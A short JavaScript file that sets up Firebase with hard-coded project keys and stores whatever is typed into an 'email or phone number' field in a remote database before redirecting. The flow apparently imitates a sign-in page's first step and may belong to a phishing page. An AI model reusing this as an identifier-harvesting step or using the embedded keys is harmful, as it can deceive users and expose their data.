// Import Firebase modules (using modular Firebase)
import { initializeApp } from "https://www.gstatic.com/firebasejs/9.17.2/firebase-app.js";
import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/9.17.2/firebase-database.js";

// Firebase configuration
const firebaseConfig = {
  apiKey: "AIzaSyDZAnKjWmv3cWhwOXpL7UjRgOpwK6mQVi0",
  authDomain: "django-eb349.firebaseapp.com",
  databaseURL: "https://django-eb349-default-rtdb.asia-southeast1.firebasedatabase.app",
  projectId: "django-eb349",
  storageBucket: "django-eb349.appspot.com",
  messagingSenderId: "271670409370",
  appId: "1:271670409370:web:51498b4b417669173f8723"
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const database = getDatabase(app);

// Handle the "Next" button click
document.getElementById('nextBtn').addEventListener('click', function () {
  const emailField = document.getElementById('email');
  const email = emailField.value.trim();

  if (email === '') {
    alert('Please enter an email or phone number.');
    emailField.focus();
    return;
  }

  // Save user data to Firebase
  saveUserData(email)
    .then(() => {
      console.log('Data saved successfully in Firebase!');
      // Redirect to the main index page
      window.location.href = 'index.html';
    })
    .catch(error => {
      console.error('Error saving data to Firebase:', error);
      alert('Failed to save data. Please try again.');
    });
});

// Function to save user data to Firebase
function saveUserData(email) {
  const userId = generateUserId(); // Generate a unique ID for the user
  const userRef = ref(database, 'users/' + userId);

  return set(userRef, {
    email: email,
    timestamp: new Date().toISOString()
  });
}

// Helper function to generate a unique user ID
function generateUserId() {
  return 'user_' + Math.random().toString(36).substr(2, 9);
}
